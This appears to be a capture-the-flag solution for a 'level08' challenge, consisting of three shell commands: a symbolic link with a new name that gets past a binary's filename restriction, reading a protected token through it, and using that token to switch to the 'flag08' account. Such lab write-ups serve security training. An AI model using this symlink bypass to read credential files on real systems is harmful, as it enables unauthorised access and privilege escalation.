# Create symbolic link with a different name in the directory with rw rights
ln -s /home/user/level08/token /var/crash/t0k3n

# Using this alias to avoid restriction
./level08 /var/crash/t0k3n

# The token is a password to flag08!
su flag08